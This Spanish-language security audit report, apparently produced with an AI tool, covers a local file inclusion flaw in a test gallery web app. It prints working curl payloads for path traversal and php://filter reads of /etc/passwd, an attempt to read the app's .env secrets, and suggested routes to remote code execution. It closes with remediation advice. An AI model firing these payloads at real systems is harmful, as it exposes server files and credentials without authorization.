# Informe de auditoría LFI — Galería de Arte Virtual

Fecha: 2026-04-27T16:23:07Z
Objetivo: http://web.dev.local:8081

Resumen ejecutivo:
Se realizó una auditoría enfocada en Local File Inclusion (LFI) sobre la aplicación web Galería de Arte Virtual.

Hallazgos principales:
- Parámetro vulnerable: gallery.php?page
- Vulnerabilidad detectada: Sí (LFI explotable mediante traversal y php://filter).
- Prueba de explotación: lectura de /etc/passwd (contenido recuperado).

Evidencia y pasos realizados:
1) Reconocimiento inicial
- Página descubierta: http://web.dev.local:8081 (index) con enlaces a gallery.php?page=...
- Punto de entrada dinámico identificado: gallery.php?page

2) Payloads y comandos ejecutados (Kali / línea de comandos)
- Comando usado para identificar inclusión con php://filter (codificar en base64):
  curl -s "http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=/etc/passwd" -L

- Comando usado para inclusión simple por traversal:
  curl -s "http://web.dev.local:8081/gallery.php?page=../../../../../../etc/passwd" -L

- Comando con terminador nulo (por compatibilidad con filtros antiguos):
  curl -s "http://web.dev.local:8081/gallery.php?page=../../../../../../etc/passwd%00" -L

- Intento de lectura de .env de la aplicación:
  curl -s "http://web.dev.local:8081/gallery.php?page=../../../../../../var/www/html/.env" -L

3) Resultados y payloads que funcionaron
- Payload que CARCINO: traversal simple
  ?page=../../../../../../etc/passwd
  Resultado: Contenido de /etc/passwd fue incluido en la respuesta HTML dentro de la sección .content. Ejemplo de líneas recuperadas:
    root:x:0:0:root:/root:/bin/bash
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

- php://filter también devolvió salida base64 incrustada en la página. La respuesta contenía la cadena base64 correspondiente al contenido de /etc/passwd (se observó texto base64 largo).

- El terminador nulo no funcionó (la aplicación devolvió error de "Página no encontrada" para la variante con %00)

4) Alcance de la explotación
- Logro: lectura de archivo crítico del sistema (/etc/passwd) mediante LFI.
- Impacto: divulgación de cuentas del sistema (usuarios locales, presencia de www-data). Esto confirma acceso a ficheros del sistema de archivos del servidor web.

5) Intentos adicionales de explotación escalada (nota)
- No se detectó /var/www/html/.env accesible con el traversal usado (el servidor respondió que el archivo no existe en esa ubicación o no es accesible).
- php://filter base64 mostró que la técnica alternativa funciona, lo que permite leer archivos binarios o con caracteres especiales si se decodifica la salida.
- Con los vectores probados, no se realizaron acciones que intentaran escritura o ejecución remota (RCE) en este test; sin embargo, con LFI confirmado, técnicas siguientes pueden permitir RCE:
  - Log poisoning + LFI para incluir /var/log/apache2/access.log (si logs escritos con contenido controlable).
  - Inclusion de wrappers que apunten a recursos remotos si allow_url_include estuviera habilitado.

Reproducción rápida (resumen):
- Vulnerable URL: http://web.dev.local:8081/gallery.php?page=../../../../../../etc/passwd
- Payload php filter: http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=/etc/passwd

Recomendaciones:
1. Validar/filtrar el parámetro 'page' para solo permitir valores esperados (lista blanca) y eliminar uso directo de include/require con parámetro controlado por el usuario.
2. Deshabilitar allow_url_include y, si es posible, deshabilitar wrappers inseguros; mantener allow_url_fopen según necesidad mínima.
3. Ejecutar el servidor web con privilegios mínimos y separar archivos sensibles fuera del árbol accesible por la web.
4. Revisar logs para detectar acceso malicioso y rotar credenciales sensibles.

Archivos y comandos ejecutados durante la auditoría:
- /app/reports/informe_kali_context_lfi_gpt5mini_2026-04-27T16-23-07Z.md (este informe)
- /tmp/lfi_test/lfi_phpfilter.txt (respuesta php://filter)
- /tmp/lfi_test/lfi_traversal.txt (respuesta traversal)
- /tmp/lfi_test/lfi_traversal_null.txt (respuesta traversal null)
- /tmp/lfi_test/lfi_env.txt (respuesta intento .env)

Conclusión:
La aplicación es vulnerable a LFI en gallery.php?page. Se confirmó la lectura de /etc/passwd (información del sistema), por lo que la vulnerabilidad está explotada con impacto evidente en confidencialidad de la información del servidor.


Co-authored-by: Copilot <223556219+Copilot@users.noreply.github.com>
